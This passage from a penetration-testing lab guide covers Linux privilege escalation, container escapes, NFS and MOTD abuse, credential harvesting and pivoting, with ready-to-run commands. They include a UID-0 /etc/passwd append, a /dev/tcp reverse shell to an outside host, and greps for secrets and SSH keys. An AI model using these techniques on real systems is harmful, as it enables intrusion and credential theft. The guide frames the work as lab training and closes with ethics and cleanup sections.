find / -writable -type f -not -path "/proc/*" -not -path "/sys/*" \
     -not -path "/dev/*" -not -path "/run/*" 2>/dev/null
find / -type f -perm -ug=rwx 2>/dev/null        # rwx for user AND group
find / -xdev -type f -perm -0002 -user root 2>/dev/null   # world-writable, root-owned
```

High-value targets:

| Path | Why |
| --- | --- |
| **`/etc/passwd`** | Append `me:<hash>:0:0:root:/root:/bin/bash` → `su me` → root |
| `/etc/shadow` | Replace a hash with one you know |
| **`/etc/update-motd.d/*`** | Scripts run **as root on every SSH login** |
| `/etc/sudoers` and `/etc/sudoers.d/*` | Add yourself a `NOPASSWD` rule |
| `/etc/exports` | Add `no_root_squash` to an NFS export |
| `/etc/ld.so.preload` | Library loaded into **every** process, as root |
| `/etc/crontab` | Add a root job |
| `/etc/profile`, `/etc/bash.bashrc` | Run on login |
| `~/.ssh/authorized_keys` of any user | Passwordless SSH as them |
| `/usr/local/bin/*` | Often earlier in `PATH` than `/usr/bin` |
| root-owned scripts in `/opt`, `/srv`, `/usr/local` | Frequently world-writable by mistake |

**The `/etc/passwd` trick in full**, because it appears in dozens of boxes:

```bash
# Kali — generate a hash for a password you choose
openssl passwd -1 -salt ignite pass123
```

```text
$1$ignite$3eTbJm98O9Hz.k1NTdNxe1
```

```bash
# target — append a UID-0 account and switch to it
echo 'ignite:$1$ignite$3eTbJm98O9Hz.k1NTdNxe1:0:0:root:/root:/bin/bash' >> /etc/passwd
su ignite          # password: pass123
id                 # uid=0(root)
```

The seven colon-separated fields are `username:password:UID:GID:GECOS:home:shell`.
**UID `0` is what makes it root** — the username is irrelevant. Placing a *real
hash* in field 2 (instead of `x`) means `su` authenticates against `/etc/passwd`
directly, so no `/etc/shadow` entry is needed.

> ⚠️ **Always regenerate the hash yourself.** MD5-crypt output is exactly 22
> characters after the final `$`. Values copied from blog posts are frequently
> mistyped — and a 21-character hash silently fails.

### 15.7 Kernel exploits

```bash
uname -a; cat /proc/version; cat /etc/os-release
searchsploit linux kernel $(uname -r | cut -d- -f1)
```

Cross-reference the kernel version at <https://www.linuxkernelcves.com/> and
<https://github.com/SecWiki/linux-kernel-exploits>. Frequent favourites:

| Exploit | Kernel | Mechanism |
| --- | --- | --- |
| **Dirty COW** (CVE-2016-5195) | < 4.8.3 | Race in copy-on-write → write any file |
| **Overlayfs** (CVE-2015-1328) | Ubuntu 3.13–3.19 | Namespace + setuid → root |
| **PwnKit** (CVE-2021-4034) | polkit < 0.120 | `pkexec` memory corruption |
| **Baron Samedit** (CVE-2021-3156) | sudo < 1.9.5p2 | `sudoedit` heap overflow |
| **Dirty Pipe** (CVE-2022-0847) | 5.8 – 5.16.11 | Page-cache write → overwrite any file |
| **io_uring** (CVE-2022-29582 etc.) | 5.6+ | Use-after-free |

> **Use kernel exploits last.** They can panic the VM, corrupt the filesystem, and
> cost you a re-import. If a clean misconfiguration path exists, take it. When you
> do use one, read the source, check the exact kernel range, and compile with the
> flags the author specifies (e.g. Dirty COW's 40847.cpp needs
> `g++ -Wall -pedantic -O2 -std=c++11 -pthread -o dcow 40847.cpp -lutil`).

### 15.8 PATH hijacking

If a root-run script calls `service`, `tar` or `python` **without an absolute
path**, it searches `$PATH` left to right. Put your own binary earlier:

```bash
mkdir -p /tmp/evil
echo '#!/bin/sh' > /tmp/evil/service
echo 'cp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash' >> /tmp/evil/service
chmod +x /tmp/evil/service
export PATH=/tmp/evil:$PATH
# wait for the job to run, then:
/tmp/rootbash -p
```

Check a SUID binary's calls with `strace` (look for `execve` of a bare name) or
`strings` (look for `system(`, `popen(`).

### 15.9 Container and group escapes

```bash
id | grep -oE 'docker|lxd|libvirt|disk|sudo|wheel|adm'
ls -la /var/run/docker.sock
cat /proc/1/cgroup        # am I inside a container?
ls -la /.dockerenv
```

> **Membership in `docker`, `lxd`, `libvirt` or `disk` is root.** There is no
> nuance: you can mount the host filesystem or start a privileged container, and
> from there it is one `echo >> /etc/passwd`.
>
> ```bash
> # docker
> docker run -v /:/mnt --rm -it alpine chroot /mnt sh
> # lxd
> lxc image import ./alpine.tar.gz --alias myimage
> lxc init myimage pwn -c security.privileged=true
> lxc config device add pwn mydev disk source=/ path=/mnt/root recursive=true
> lxc start pwn && lxc exec pwn /bin/sh     # then /mnt/root is the host's /
> # docker.sock
> curl --unix-socket /var/run/docker.sock -X POST \
>   "http://localhost/containers/create?name=pwn" \
>   -H 'Content-Type: application/json' \
>   -d '{"Image":"alpine","Cmd":["/bin/sh"],"Binds":["/:/mnt"],"Privileged":true}'
> ```

### 15.10 NFS `no_root_squash`

```bash
cat /etc/exports        # or read it through an LFI
showmount -e target
```

If an export is `rw` with **`no_root_squash`**, root on your Kali box is honoured
as root on the target *for those files*. Mount it, then create a SUID binary:

```bash
sudo mount -t nfs target:/share /mnt/share
sudo cp /bin/bash /mnt/share/rootbash && sudo chmod +s /mnt/share/rootbash
# on the target, as any user:
/share/rootbash -p        # → root
```

`root_squash` (the default) maps client-root to `nobody`, which defeats this. Its
absence is the vulnerability.

### 15.11 MOTD injection

Scripts in **`/etc/update-motd.d/`** are executed by `pam_motd` during SSH login,
historically **as root**. If any is writable by you, append a payload and log in
again:

```bash
echo 'bash -c "bash -i >& /dev/tcp/192.168.56.10/9090 0>&1"' >> /etc/update-motd.d/00-header
exit
ssh user@target            # → root reverse shell
```

Check with `ls -la /etc/update-motd.d/` and
`find /etc/update-motd.d/ -perm /o+w -o -perm /g+w`.

### 15.12 Automated help

```bash
./linpeas.sh -a 2>/dev/null | tee linpeas.txt
./LinEnum.sh -t
./linux-smart-enumeration.sh
./pspy64 -pf
```

> Read the output rather than grepping for "root". `linpeas` colour-codes by
> likelihood: **red/yellow** findings are the ones worth chasing. Everything
> else is noise — usually several hundred lines of it.

---

## 16. Post-exploitation and lateral movement

Once you are root on one box, the engagement is not over. In a lab it usually is;
in reality this is where the real work starts.

### 16.1 Internal enumeration

```bash
ss -tulnp                                   # services bound to 127.0.0.1 — invisible to external nmap
ip a; ip route; cat /etc/resolv.conf        # other networks you can now reach
arp -a; cat /etc/hosts                      # hosts the target already knows about
cat /etc/passwd | grep -E '/bin/(ba)?sh$'   # other users
find / -name "*.pem" -o -name "id_rsa" -o -name "*.kdbx" 2>/dev/null
grep -riE 'password|passwd|pwd|secret|token|api[_-]?key' /var/www /home /opt /etc 2>/dev/null | head -50
history; cat /home/*/.bash_history
```

> **`ss -tulnp` is the post-exploitation equivalent of `nmap -p-`.** Services on
> loopback were invisible from outside. They are frequently the most vulnerable
> thing on the machine — an unauthenticated Redis, a MySQL with an empty root
> password, a debug console.

### 16.2 Harvesting credentials

| Source | What it yields |
| --- | --- |
| `wp-config.php`, `configuration.php`, `.env`, `settings.py`, `web.config` | DB passwords, API keys — **cleartext** |
| `/etc/shadow` | Crackable hashes for every local user |
| `~/.ssh/id_rsa`, `~/.ssh/authorized_keys`, `~/.ssh/known_hosts` | Keys, and the list of hosts the user connects to |
| `~/.bash_history` | Passwords typed on the command line, `mysql -p…`, `sshpass` |
| Browser/profile data, `~/.mozilla`, `~/.config/google-chrome` | Saved passwords |
| `/root/.mysql_history`, `/root/.psql_history` | Queries including credentials |
| Git history | Deleted secrets — `git log -p \| grep -i password` |

### 16.3 Pivoting

```bash
# Local port forward: expose an internal service on YOUR machine
ssh -L 8080:10.10.10.5:80 user@target

# Remote port forward: expose YOUR tool to the target's network
ssh -R 9090:localhost:9090 user@target

# Dynamic SOCKS proxy: route arbitrary traffic through the target
ssh -D 1080 user@target
proxychains4 nmap -sT -Pn 10.10.10.0/24       # -sT and -Pn are REQUIRED through a proxy

# Purpose-built tunnellers
chisel server -p 8000 --reverse                 # on Kali
./chisel client 192.168.56.10:8000 R:socks      # on target
ligolo-ng, sshuttle -r user@target 10.10.10.0/24
```

> **`proxychains` needs `-sT` (full TCP connect) and `-Pn` (no ping).** SYN scans
> and ICMP do not traverse a SOCKS proxy. Getting this wrong produces an empty
> scan and a very confusing afternoon.

---

## 17. Flags, proofs and CTF conventions

VulnHub machines use inconsistent conventions, so know all of them:

| Convention | Where |
| --- | --- |
| `proof.txt` | `/root/proof.txt` — the Metasploitable/OffSec tradition |
| `root.txt` / `user.txt` | `/root/` and `/home/<user>/` — the HackTheBox tradition |
| `flag.txt`, `flag1.txt` … `flagN.txt` | Scattered: web root, home dirs, `/root`, `/media`, database tables |
| `final.txt`, `congrats.txt`, `TheEnd.txt` | Ad-hoc, author-specific |
| Inside the database | `wp_posts.post_content`, a `hint` table, a `flags` table |
| In the page source | HTML comments, `<meta>` tags, hidden `<div>`s |
| In an image | EXIF metadata (`exiftool`), appended after the EOI marker, LSB steganography (`steghide`, `zsteg`) |

Find them all at once:

```bash
find / -iregex '.*\(flag\|proof\|root\|user\|final\|congrats\)[0-9]*\.txt' 2>/dev/null
grep -rIl 'flag{' / --exclude-dir=proc --exclude-dir=sys 2>/dev/null
```

> **Read the VulnHub description for the objective.** Some boxes say *"find 2
> flags (user.txt and root.txt)"*; others say *"boot to root"*; HA: Wordy says
> completion requires exploiting **all** vulnerabilities and finding **all 3**
> flags. Knowing the win condition stops you quitting early or over-working.

---

## 18. Reporting, cleanup and ethics

### 18.1 What a finding looks like

For every vulnerability you use, be able to state:

1. **What** it is, precisely (e.g. "unauthenticated arbitrary file upload in
   Reflex Gallery 3.4").
2. **Where** it is (URL, parameter, file path, line number if you have source).
3. **How** you proved it (the request, the response, the resulting shell).
4. **Impact** (what an attacker gains — RCE, data disclosure, root).
5. **Remediation** (the specific fix, not "patch it").
6. **Severity** (CVSS vector, or a plain-English justification).

Every lab README in this repository has a **"Summary of vulnerabilities"** table
and a **"Defensive lessons"** section for exactly this reason. Writing them is
not optional garnish — it is the deliverable that distinguishes a penetration
tester from a script kiddie.

### 18.2 Clean up after yourself

```bash
# Remove uploaded shells and tools
rm -f /var/www/html/shell.php /tmp/linpeas.sh /tmp/pspy64 /tmp/*.so
# Revert modified config files
mv /etc/passwd.bak /etc/passwd; chmod u-s /bin/nano
# Kill leftover listeners and cron entries you added
crontab -l | grep -v 'your payload' | crontab -
# Unmount NFS shares
sudo umount /mnt/share
# Delete containers
lxc stop pwn && lxc delete pwn && lxc image delete myimage
```

On a shared lab VM this matters practically: leaving a broken `index.php` or a
SUID `nano` behind ruins the box for the next student.

### 18.3 Ethics

- **Only attack systems you own or have written permission to test.** VulnHub
  VMs on an isolated host-only network are yours. Your employer's network is not,
  even if you work in IT there.
- **Do not use these techniques against real targets.** The law does not
  distinguish between "I was only testing" and "I broke in."
- **Do not look at real people's data** even when you have access. On an
  engagement, stop at proof and report.
- **Responsible disclosure:** if you find a genuine vulnerability in real
  software, report it to the vendor privately and allow time to fix before
  publishing.
- `hydra`, `sqlmap`, Metasploit and `nmap` are all legal to *own and use in a
  lab*. The legality comes from the target, not the tool.

---

_Back to the [README](../README.md) · [lab setup](LAB-SETUP.md) · [tools](TOOLS.md) · [beginner path](BEGINNER-PATH.md) · [catalog](CATALOG.md)._
